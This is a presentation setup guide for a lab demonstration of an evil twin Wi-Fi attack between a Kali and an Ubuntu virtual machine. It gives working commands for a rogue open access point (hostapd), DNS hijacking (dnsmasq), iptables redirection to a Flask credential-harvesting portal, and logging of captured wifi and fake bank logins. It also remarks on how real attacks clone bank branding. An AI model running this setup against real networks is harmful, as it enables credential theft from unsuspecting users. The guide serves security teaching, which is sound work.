# Evil Twin Attack — Presentation Setup Guide

Topology: Kali VM = attacker/rogue AP. Ubuntu VM = victim client.
Both VMs on the same virtual network (host-only or internal network adapter in VirtualBox/VMware, NOT NAT).

## 1. Install dependencies (Kali VM)

```bash
sudo apt update
sudo apt install hostapd dnsmasq python3-flask -y
```

## 2. Stop conflicting services

```bash
sudo systemctl stop hostapd
sudo systemctl stop dnsmasq
sudo systemctl stop NetworkManager   # will manage wlan0 manually
```

## 3. Configure the wireless interface

```bash
sudo ip link set wlan0 down
sudo ip addr add 192.168.50.1/24 dev wlan0
sudo ip link set wlan0 up
```

## 4. Enable IP forwarding + NAT (so victim still gets "internet" feel if needed)

```bash
sudo sysctl -w net.ipv4.ip_forward=1
sudo iptables -t nat -A POSTROUTING -o eth0 -j MASQUERADE
sudo iptables -A FORWARD -i wlan0 -o eth0 -j ACCEPT
sudo iptables -A FORWARD -i eth0 -o wlan0 -m state --state RELATED,ESTABLISHED -j ACCEPT

# Force all HTTP traffic on port 80 to the local Flask portal
sudo iptables -t nat -A PREROUTING -i wlan0 -p tcp --dport 80 -j DNAT --to-destination 192.168.50.1:80
```

## 5. Start dnsmasq (DHCP + DNS hijack)

```bash
sudo cp dnsmasq.conf /etc/dnsmasq.conf
sudo dnsmasq -C /etc/dnsmasq.conf -d &
```

## 6. Start hostapd (the rogue AP broadcast)

```bash
sudo hostapd hostapd.conf
```

Leave this running in its own terminal — it logs client associations live, good for the presentation.

## 7. Start the captive portal (Flask)

In a new terminal, as root (port 80 needs it):

```bash
cd evil_twin_demo
sudo python3 portal.py
```

Watch `captured_creds.log` or the terminal output — both wifi and bank-demo
submissions print live as `[CAPTURED] ...` lines. Good to have this terminal
visible on screen during the demo.

## 8. On the Ubuntu VM (victim)

- Open Wi-Fi settings, connect to "Free_Public_WiFi" (open network, no password needed to associate)
- Open a browser, navigate to any http:// site — DNS hijack forces it to the portal
- Enter a (fake, for the demo) wifi password → redirected to the "SecureTrust Bank" page
- Enter fake bank credentials → redirected to the reveal page

Switch back to the Kali terminal to show the audience the captured plaintext
password and bank credentials appearing in `captured_creds.log`.

## 9. Teardown after the demo

```bash
sudo pkill hostapd
sudo pkill dnsmasq
sudo systemctl start NetworkManager
sudo iptables -F
sudo iptables -t nat -F
```

## Presentation talking points

- Victim associates to an open AP with a trusted-sounding name — no cryptographic
  verification of AP identity happens at the 802.11 layer, so spoofing SSID is trivial.
- DNS hijack via dnsmasq forces every domain to resolve to the attacker, which is why
  a captive-portal-style redirect works regardless of what URL the victim types.
- Credential reuse (same password for wifi "login" and other accounts) is why
  harvesting even a throwaway-looking login page is dangerous.
- Real attacks drop the "SIMULATED" banner and clone the real bank's CSS/branding
  pixel-for-pixel, often via `wget --mirror` or cloning tools — mention this but you
  don't need to demonstrate it live.
